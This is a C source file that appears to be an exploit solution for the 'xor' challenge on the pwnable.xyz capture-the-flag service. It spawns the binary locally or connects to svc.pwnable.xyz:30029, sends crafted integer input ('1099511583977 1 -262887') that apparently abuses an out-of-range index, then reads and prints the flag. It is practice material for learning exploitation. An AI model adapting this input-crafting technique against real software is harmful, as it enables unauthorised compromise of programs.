#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#include <exdev.h>

#ifdef EXPLOIT_LOCAL
#define BINPATH "./xor"
#else
#include <netinet/in.h>
#define HOST "svc.pwnable.xyz"
#define PORT 30029
#endif


int main(int argc, char **argv, char **envp){
    char buf[255];

    memset(buf, 0, 255);

#ifdef EXPLOIT_LOCAL
    PROC *p = NULL;
    char *args[] = {BINPATH, NULL};
    
    p = process(BINPATH, args, envp, 0);
    if(!p){
        fprintf(stderr, "Failed to spawn process \"%s\"\n", BINPATH);
        return 1;
    }
    read(p->stdout, buf, 15);
    read(p->stdout, buf, 9);
    memset(buf, 0, 15);
    strncpy(buf, "1099511583977 1 -262887\n", 25);
    write(p->stdin, buf, 24);
    memset(buf, 0, 25);
    
    read(p->stdout, buf, 32);
    memset(buf, 0, 32);
    strncpy(buf, "a a a\n", 7);
    write(p->stdin, buf, 6);
    read(p->stderr, buf, 64);
    printf("%s\n", buf);

    reap_process(p);

#elif EXPLOIT_REMOTE
    REMOTE *r = NULL;

    r = remote(HOST, PORT, AF_INET, SOCK_STREAM);
    if(!r){
        fprintf(stderr, "%s:%d:remote(): Failed to connect to %s:%hu\n", __FILE__, __LINE__, HOST, PORT);
        return 1;
    }
    printf("Connected to %s:%hu\n", HOST, PORT);
    read(r->sock, buf, 15);
    read(r->sock, buf, 9);
    memset(buf, 0, 15);
    
    strncpy(buf, "1099511583977 1 -262887\n", 25);
    write(r->sock, buf, 24);
    memset(buf, 0, 25);

    read(r->sock, buf, 32);
    memset(buf, 0, 32);
    strncpy(buf, "a a a\n", 7);
    write(r->sock, buf, 6);

    read(r->sock, buf, 64);
    printf("Flag: %s\n", buf);
    remote_close(r);
#endif
    return 0;
}